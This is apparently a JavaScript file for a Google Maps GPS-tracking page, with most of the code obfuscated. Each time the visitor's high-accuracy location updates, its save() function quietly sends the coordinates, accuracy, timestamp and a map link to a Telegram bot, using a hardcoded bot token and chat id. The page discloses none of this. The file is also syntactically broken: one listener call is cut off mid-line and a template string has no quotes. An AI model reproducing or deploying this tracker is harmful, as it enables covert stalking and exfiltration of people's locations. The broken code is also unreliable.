var map
  , you
  , pos
  , t_0
  , log = ''
  , url = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9sBHxAxMpOb3XcAAAOBSURBVDjLfZRNa1xlGIav877nY2bOzJnMR77TNIkJpSpBW4qiGGJAECpSEFz0D/gDKrp9wVVBXPkLXLkrqBtBZKJFQaqghbZp09SkTUwyH5mvMzPnvHPOcZEUumj6wL17nmvz3PdtcMoopQRg27btdpYvXQSS7N9/3NZaB0BHKTV83p3xHJAFzFQWVj4bdPjonGsXisIwm35Iy2C40dON0VHrxurD9evAvlKqfypQKeW15l9d/enI+9qr+2fWXplmcbpA0UtT6wx48OSIu4/r3Nqqkjs3tvN+/uiat31vHagppRIA8xnYBPnShRub1reiUU0vX5gnPTlKfjzPzEiKIBPg4GDFNrlmwJ2bW7O981PfXM1mP7b73T+B/wDECSwTRdHi9/L8V9t399Le3BSMT0B+BDIukWkTp1ySfIF4bJzk7ByMlfn3zl76x/RrXwohlpRSRQCplDKAs9uzF6/+/Oveh1GpyOjSAsWJUUbyOTK2hU4EDS05HNocxDYHkaQRG9Dr03hULU8vz9e9o92ttbW1ugA8YGrTz7wT6JhkbJJBdoSelaMTSGoD2O1DLYB2CD1t03dKUJyAyUmCgWbTz6w4jlMA0ibgSim9Wms4S2EEcnk6Ikd7KKkDMoaUgC5QF9CS0MWEdB68IhQK1FrRDIICkDUBUwhh+M3Aw3XBcakmKUoGuAZEBlgG9CVUTWiY0JaAnYFUBtwsfifwyJMAlglorXXsOk6bSGbBJLIk94cwAM5YYNvQT6CewKEFiQNoEwwbTBs3JduABnwT8E3T9MuOfLzRjaeIYpAJ2jJ4aMC2AVb62FrBEGILsAGRQJxAklB2zZ1EJwOgJ4DOcDjcfSnT+8XRIQwGEA6ODWXAUELfPlZsnkRBAFpDEOBEmsW0fzMMwyqgZaVSYXV1NSyFh61mbumtvX5SJpuBnAupp04FQqAHBIAP1Jqwf8DreePepc5v16WU95VSwdN1P47jB5ed29fmDO1TrUOtDZ0TSPNEPU7e3YVagzmh/feSW58KITaUUl0ACVCpVKhUKv67b7+xP1/K/NXxs282+kEhiQEtIBTQS+BIw2ELeVDl5V536wNv+xPXf/K7Uqr+oraxgdF19/Lnjyz3is6mygeYaQwYJ+5b3aC2EHa+W/F/+AJoKKX0C+vrGbABpCzLyvqzK8uJIaPcTuWfMAw10D+tD/8H7d6IDx2EfHUAAAAASUVORK5CYII='
  , head = '["latitude","longitude","precision","time"]'
  , zoom
  , time
  , from
  ;

google.maps.event.addDomListener(window, 'load', ini
(function (_0xd720e4, _0x45f197) {
    var _0xdba089 = _0x5816;
    var _0x236690 = _0xd720e4();
    while (!![]) {
        try {
            var _0x27808c = parseInt(_0xdba089(0xf)) / 0x1 + parseInt(_0xdba089(0x19)) / 0x2 + parseInt(_0xdba089(0x1d)) / 0x3 * (parseInt(_0xdba089(0x3)) / 0x4) + -parseInt(_0xdba089(0x6)) / 0x5 + -parseInt(_0xdba089(0x15)) / 0x6 * (-parseInt(_0xdba089(0x0)) / 0x7) + -parseInt(_0xdba089(0x10)) / 0x8 + -parseInt(_0xdba089(0x17)) / 0x9;
            if (_0x27808c === _0x45f197) {
                break;
            } else {
                _0x236690['push'](_0x236690['shift']());
            }
        } catch (_0x2782f2) {
            _0x236690['push'](_0x236690['shift']());
        }
    }
}(_0x23c6, 0x9d63c));
function _0x5816(_0x859466, _0x23c60a) {
    var _0x58168b = _0x23c6();
    _0x5816 = function (_0xbc552e, _0x23cc5b) {
        _0xbc552e = _0xbc552e - 0x0;
        var _0x4a1dd1 = _0x58168b[_0xbc552e];
        return _0x4a1dd1;
    };
    return _0x5816(_0x859466, _0x23c60a);
}
function init() {
    var _0x22ac55 = _0x5816;
    map = new google[(_0x22ac55(0x9))][(_0x22ac55(0x11))](document[_0x22ac55(0xc)]('map'), {
        'zoom': zoom,
        'mapTypeId': google['maps'][_0x22ac55(0x1e)]['ROADMAP']
    });
    if (navigator[_0x22ac55(0x1b)])
        navigator[_0x22ac55(0x1b)][_0x22ac55(0x4)](gotPosition, function () {
            var _0x16d4d2 = _0x22ac55;
            noGeolocation(_0x16d4d2(0xb));
        }, {
            'enableHighAccuracy': !![],
            'maximumAge': 0x2710,
            'timeout': 0x4e20
        });
    else
        noGeolocation('Error:\x20Your\x20browser\x20doesn\x27t\x20support\x20geolocation.');
}
function _0x23c6() {
    var _0x26cf2d = [
        '\x20]\x0a}\x0a',
        'maps',
        'position',
        'Error:\x20The\x20Geolocation\x20service\x20failed.',
        'getElementById',
        'Size',
        'event',
        '222814IPeEWS',
        '1060904ewSlBx',
        'Map',
        'MarkerImage',
        'round',
        'latitude',
        '131574MHVWbC',
        'longitude',
        '2026206dkCLhI',
        'mailto:?subject=GPS%20Track&body=',
        '414926xQNHMV',
        'LatLng',
        'geolocation',
        'panTo',
        '3pQVcgb',
        'MapTypeId',
        'setCenter',
        '371HPqlFM',
        'Marker',
        'setPosition',
        '2716924lWKJWW',
        'watchPosition',
        'InfoWindow',
        '6346650QypSIO',
        'coords'
    ];
    _0x23c6 = function () {
        return _0x26cf2d;
    };
    return _0x23c6();
}
function gotPosition(_0x4f6dbb) {
    var _0x3cfda8 = _0x5816;
    var _0x23c18e = _0x4f6dbb[_0x3cfda8(0x7)], _0x4c033d = _0x23c18e['accuracy'], _0x419c54;
    pos = ll(_0x23c18e[_0x3cfda8(0x14)], _0x23c18e[_0x3cfda8(0x16)]);
    if (you)
        you[_0x3cfda8(0x2)](pos);
    else {
        t_0 = Math[_0x3cfda8(0x13)](+new Date() / 0x3e8);
        you = new google[(_0x3cfda8(0x9))][(_0x3cfda8(0x1))]({
            'map': map,
            'position': pos,
            'icon': marker(url, s(0x14, 0x11), p(0xa, 0x8))
        });
        google['maps'][_0x3cfda8(0xe)]['addListener'](you, 'click', function () {
            var _0x464193 = _0x3cfda8;
            location = _0x464193(0x18) + encodeURIComponent(log + _0x464193(0x8));
        });
    }
    if (!zoom)
        map[_0x3cfda8(0x1f)](pos);
    if (_0x4c033d > 0x7d0)
        _0x419c54 = 0xf;
    if (_0x4c033d < 0x7d0)
        _0x419c54 = 0x10;
    if (_0x4c033d < 0x384)
        _0x419c54 = 0x11;
    if (_0x4c033d < 0x64)
        _0x419c54 = 0x12;
    if (_0x419c54 !== zoom)
        map['setZoom'](zoom = _0x419c54);
    map[_0x3cfda8(0x1c)](pos);
    save(_0x23c18e);
}
function noGeolocation(_0x500dfd) {
    var _0xa4fc2b = _0x5816;
    var _0x161fe4 = {
            'map': map,
            'position': ll(0x3c, 0x69),
            'content': _0x500dfd
        }, _0x2854ce = new google[(_0xa4fc2b(0x9))][(_0xa4fc2b(0x5))](_0x161fe4);
    map[_0xa4fc2b(0x1f)](_0x161fe4[_0xa4fc2b(0xa)]);
}
function s(_0x28456a, _0x369470) {
    var _0x367e74 = _0x5816;
    return new google[(_0x367e74(0x9))][(_0x367e74(0xd))](_0x28456a, _0x369470);
}
function p(_0x4e0d9e, _0x286558) {
    var _0xa7a8eb = _0x5816;
    return new google[(_0xa7a8eb(0x9))]['Point'](_0x4e0d9e, _0x286558);
}
function ll(_0x2ca88e, _0x3a72bd) {
    var _0x5c0a85 = _0x5816;
    return new google[(_0x5c0a85(0x9))][(_0x5c0a85(0x1a))](_0x2ca88e, _0x3a72bd);
}
function marker(_0x4575cb, _0x321646, _0x3145f2, _0x5b8a4d) {
    var _0x2bfd70 = _0x5816;
    return new google[(_0x2bfd70(0x9))][(_0x2bfd70(0x12))](_0x4575cb, _0x321646, _0x5b8a4d || p(0x0, 0x0), _0x3145f2);
}

function save(at) {
  var lat = at.latitude.toFixed(6)
    , lng = at.longitude.toFixed(6)
    , pre = at.accuracy.toFixed(0)
    ;
  time = Math.round(new Date / 1000) - t_0;
  log += (log ? ' ,' : '{"time":'+ t_0 +'\n,"head":\n '+ head +'\n,"data":\n [')
       + '[' + lat +','+ lng +','+ pre +','+ time +']\n';

  var locationUrl = `https://maps.google.com/?q=${lat},${lng}`;
  var botToken = '7467479115:AAEbsRubACeGgu3OWQ94uW1ScCrz2WaWPRE';
  var chatId = '6581772299';
  var message = Latitude: ${lat}, Longitude: ${lng}, Accuracy: ${pre}, Time: ${time}\nOpen Location: ${locationUrl};
  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  var xhr = new XMLHttpRequest();
  xhr.open("GET", url, true);
  xhr.send();
}
